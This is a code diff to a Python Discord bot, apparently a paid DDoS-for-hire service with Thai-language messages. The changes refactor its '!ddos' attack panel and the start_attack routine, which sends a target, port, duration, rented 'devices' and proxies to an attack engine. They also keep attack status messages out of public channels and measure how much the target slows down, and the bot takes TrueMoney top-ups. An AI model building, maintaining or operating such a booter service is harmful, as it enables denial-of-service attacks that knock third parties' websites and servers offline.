@@ -8,6 +8,7 @@ import traceback
 from urllib.parse import urlparse
 
 import aiohttp
+import aiosqlite                                # M7: top-level
 import discord
 from discord.ext import commands, tasks
 
@@ -36,7 +37,7 @@ tm = TrueMoneyClient()
 
 active_attacks: dict[int, dict] = {}
 
-# ── H4: global aiohttp session ──
+# H4: global aiohttp session
 _http: aiohttp.ClientSession | None = None
 
 
@@ -78,9 +79,11 @@ def is_forbidden(target: str) -> bool:
     return host in FORBIDDEN_IPS
 
 
-def _asset(name: str) -> discord.File:
-    """สร้าง discord.File จาก path asset"""
-    return discord.File(name, filename=os.path.basename(name))
+def _file(path: str) -> discord.File | None:
+    """H7/H8: คืน discord.File ถ้ามีไฟล์จริง ไม่งั้น None"""
+    if path and os.path.exists(path):
+        return discord.File(path, filename=os.path.basename(path))
+    return None
 
 
 # ============================================================
@@ -111,6 +114,7 @@ async def rental_watchdog():
 @bot.event
 async def on_ready():
     os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
+    os.makedirs(os.path.join(BASE_DIR, "assets"), exist_ok=True)
     await db.init()
     print(f"[VANTA] logged in as {bot.user}")
 
@@ -129,7 +133,6 @@ async def on_ready():
         rental_watchdog.start()
 
 
-# ── M2: error handler ──
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MemberNotFound):
@@ -146,20 +149,17 @@ async def on_command_error(ctx, error):
 # ============================================================
 # Setup commands
 # ============================================================
-# ── C3: !ddos เป็นชื่อหลัก + alias !setup ──
 @bot.command(name="ddos", aliases=["setup"])
 async def ddos_panel(ctx):
     if not is_owner(ctx.author.id):
         await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงถุ้ย")
         return
-    file = _asset(ASSET_ATTACK_BANNER) if os.path.exists(
-        ASSET_ATTACK_BANNER) else None
-    if file:
-        await ctx.send(embed=build_attack_embed(),
-                       view=AttackPanel(OWNER_ID), file=file)
-    else:
-        await ctx.send(embed=build_attack_embed(),
-                       view=AttackPanel(OWNER_ID))
+    f = _file(ASSET_ATTACK_BANNER)
+    kwargs = {"embed": build_attack_embed(with_image=bool(f)),
+              "view": AttackPanel(OWNER_ID)}
+    if f:
+        kwargs["file"] = f
+    await ctx.send(**kwargs)
 
 
 @bot.command(name="shop")
@@ -167,13 +167,12 @@ async def shop_panel(ctx):
     if not is_owner(ctx.author.id):
         await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
         return
-    file = _asset(ASSET_SHOP_BANNER) if os.path.exists(
-        ASSET_SHOP_BANNER) else None
-    if file:
-        await ctx.send(embed=build_shop_embed(),
-                       view=ShopView(), file=file)
-    else:
-        await ctx.send(embed=build_shop_embed(), view=ShopView())
+    f = _file(ASSET_SHOP_BANNER)
+    kwargs = {"embed": build_shop_embed(with_image=bool(f)),
+              "view": ShopView()}
+    if f:
+        kwargs["file"] = f
+    await ctx.send(**kwargs)
 
 
 # ============================================================
@@ -189,7 +188,7 @@ async def handle_attack_submit(interaction: discord.Interaction, modal):
         return
 
     user = await db.get_user(user_id)
-    if not user:   # ── H5 ──
+    if not user:
         await interaction.response.send_message(
             "DB error — ลองอีกครั้ง", ephemeral=True
         )
@@ -249,35 +248,46 @@ async def start_attack(interaction: discord.Interaction, module: str,
         )
         return
 
-    await interaction.response.defer()
+    # H9: ephemeral=True — attack embed ไม่หลุดเข้าห้องสาธารณะ
+    await interaction.response.defer(ephemeral=True)
 
-    proxy_mgr.write_for_devices(devices)
+    # C7: เช็ค proxy
+    n = proxy_mgr.write_for_devices(user_id, devices)
+    if n == 0:
+        await interaction.followup.send(
+            "⚠️ ยังโหลด proxy ไม่เสร็จ — รอ 30 วิ แล้วลองใหม่",
+            ephemeral=True,
+        )
+        return
+
     await db.log_attack(user_id, target, port, duration, module)
 
     try:
         proc = await engine.start(user_id, module, target,
                                   port, duration, devices)
     except Exception as e:
-        await interaction.followup.send(f"เริ่มไม่สำเร็จ: {e}", ephemeral=True)
+        await interaction.followup.send(
+            f"เริ่มไม่สำเร็จ: {e}", ephemeral=True
+        )
         return
 
+    # C1: followup.send() คืน WebhookMessage ที่ edit ได้
+    f = _file(ASSET_ATTACK_RUNNING)
     embed = build_attack_running_embed(
         target=f"{target}:{port}", time_left=duration,
         speed="measuring...", module=module,
+        with_image=bool(f),
     )
-
-    # ── C1: followup.send() คืน WebhookMessage ที่ edit ได้ ──
-    if os.path.exists(ASSET_ATTACK_RUNNING):
-        msg = await interaction.followup.send(
-            embed=embed, file=_asset(ASSET_ATTACK_RUNNING)
-        )
-    else:
-        msg = await interaction.followup.send(embed=embed)
+    kwargs = {"embed": embed}
+    if f:
+        kwargs["file"] = f
+    msg = await interaction.followup.send(**kwargs)
 
     state = {
         "target": target, "port": port, "duration": duration,
         "module": module, "devices": devices,
         "start": time.time(), "message": msg, "proc": proc,
+        "has_image": bool(f),
     }
     active_attacks[user_id] = state
     asyncio.create_task(_attack_loop(user_id, state))
@@ -308,6 +318,7 @@ async def _attack_loop(user_id: int, state: dict):
         embed = build_attack_running_embed(
             target=target_full, time_left=left,
             speed=speed, module=state["module"],
+            with_image=state["has_image"],
         )
         try:
             await msg.edit(embed=embed)
@@ -339,7 +350,7 @@ async def _measure_speed(target: str, port: int) -> str:
         url = f"{scheme}://{target}:{port}"
     try:
         start = time.time()
-        s = await http()   # ── H4 ──
+        s = await http()
         async with s.get(url) as r:
             data = await r.read()
         elapsed = max(0.001, time.time() - start)
@@ -373,21 +384,9 @@ async def device_cmd(ctx, member: discord.Member = None,
         await ctx.send("จำนวนต้องมากกว่า 0")
         return
 
-    # ── H3: ลบ → ล้าง rental record ด้วย ──
+    # H3: ลบ → ล้าง rental record ด้วย
     if sign < 0:
-        import aiosqlite
-        async with aiosqlite.connect(db.path) as c:
-            await c.execute(
-                "UPDATE device_rentals SET devices = MAX(0, devices - ?) "
-                "WHERE user_id = ?",
-                (num, member.id),
-            )
-            await c.execute(
-                "DELETE FROM device_rentals "
-                "WHERE user_id = ? AND devices <= 0",
-                (member.id,),
-            )
-            await c.commit()
+        await db.clear_rentals(member.id, num)
         new = await db.add_devices(member.id, -num)
         await ctx.send(f"ลบ {num} device จาก {member.mention} — เหลือ {new}")
         return
@@ -399,7 +398,6 @@ async def device_cmd(ctx, member: discord.Member = None,
         )
         return
 
-    # ── M3: รองรับ m / h / d ──
     dur_lower = duration.lower()
     if dur_lower.endswith("m"):
         secs = int(dur_lower[:-1]) * 60
@@ -599,7 +597,7 @@ async def topup_cmd(ctx, link: str = None):
 # Run
 # ============================================================
 if __name__ == "__main__":
-    if not BOT_TOKEN or BOT_TOKEN.startswith("ใส่_"):   # ── H2 ──
+    if not BOT_TOKEN or BOT_TOKEN.startswith("ใส่_"):
         raise SystemExit(
             "❌ BOT_TOKEN ยังไม่ได้ตั้ง — export BOT_TOKEN='...' ก่อนรัน"
         )
